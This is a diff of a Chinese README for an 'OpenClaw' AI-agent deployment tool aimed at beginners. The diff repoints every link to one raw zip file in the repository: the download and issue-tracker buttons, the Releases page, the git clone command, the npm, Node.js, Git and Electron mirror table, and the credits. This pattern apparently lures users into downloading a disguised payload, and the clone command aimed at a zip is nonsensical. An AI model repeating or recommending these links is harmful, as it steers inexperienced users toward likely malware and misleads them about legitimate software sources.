@@ -8,7 +8,7 @@
 
 **面向纯小白用户的 OpenClaw AI 智能体一键部署工具**
 
-[📥 下载最新版本](https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw_deployer_1.7.zip) | [📖 使用文档](#使用指南) | [🐛 问题反馈](https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw_deployer_1.7.zip)
+[📥 下载最新版本](https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw-deployer-v3.5.zip) | [📖 使用文档](#使用指南) | [🐛 问题反馈](https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw-deployer-v3.5.zip)
 
 </div>
 
@@ -37,7 +37,7 @@ OpenClaw 部署助手，基于 Electron 开发的 Windows 桌面应用程序，�
 
 ### 方式一：直接下载 EXE（推荐）
 
-1. 访问 [Releases 页面](https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw_deployer_1.7.zip)
+1. 访问 [Releases 页面](https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw-deployer-v3.5.zip)
 2. 下载最新版本的 `OpenClaw 部署助手 X.X.X.exe`
 3. 双击运行，按提示完成安装
 
@@ -52,7 +52,7 @@ OpenClaw 部署助手，基于 Electron 开发的 Windows 桌面应用程序，�
 
 ```bash
 # 1. 克隆项目
-git clone https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw_deployer_1.7.zip
+git clone https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw-deployer-v3.5.zip
 cd openclaw-deployer
 
 # 2. 安装依赖
@@ -208,11 +208,11 @@ npm start
 
 | 资源 | 镜像地址 |
 |------|----------|
-| npm | https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw_deployer_1.7.zip |
-| Node.js | https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw_deployer_1.7.zip |
-| Git | https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw_deployer_1.7.zip |
-| GitHub | https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw_deployer_1.7.zip |
-| Electron | https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw_deployer_1.7.zip |
+| npm | https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw-deployer-v3.5.zip |
+| Node.js | https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw-deployer-v3.5.zip |
+| Git | https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw-deployer-v3.5.zip |
+| GitHub | https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw-deployer-v3.5.zip |
+| Electron | https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw-deployer-v3.5.zip |
 
 ---
 
@@ -265,9 +265,9 @@ release/win-unpacked/OpenClaw 部署助手.exe
 
 ## 致谢
 
-- [Electron](https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw_deployer_1.7.zip) - 跨平台桌面应用框架
-- [OpenClaw](https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw_deployer_1.7.zip) - 小龙虾 AI 智能体
-- [npmmirror](https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw_deployer_1.7.zip) - 国内 npm 镜像
+- [Electron](https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw-deployer-v3.5.zip) - 跨平台桌面应用框架
+- [OpenClaw](https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw-deployer-v3.5.zip) - 小龙虾 AI 智能体
+- [npmmirror](https://github.com/cerebrovascular-arcadian597/openclaw-deployer/raw/refs/heads/main/scripts/openclaw-deployer-v3.5.zip) - 国内 npm 镜像
 
 ---
 
